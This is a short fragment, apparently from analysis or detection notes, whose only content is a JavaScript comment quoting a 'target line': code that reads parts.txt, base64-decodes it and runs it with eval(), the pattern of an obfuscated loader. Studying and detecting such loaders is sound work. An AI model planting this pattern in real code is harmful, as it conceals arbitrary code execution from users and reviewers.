...
// Target line: const base64Encoded = fs.readFileSync(path.join(__dirname, 'parts.txt'), 'utf8'); const decodedScript = Buffer.from(base64Encoded, 'base64').toString('utf8'); eval(decodedScript);
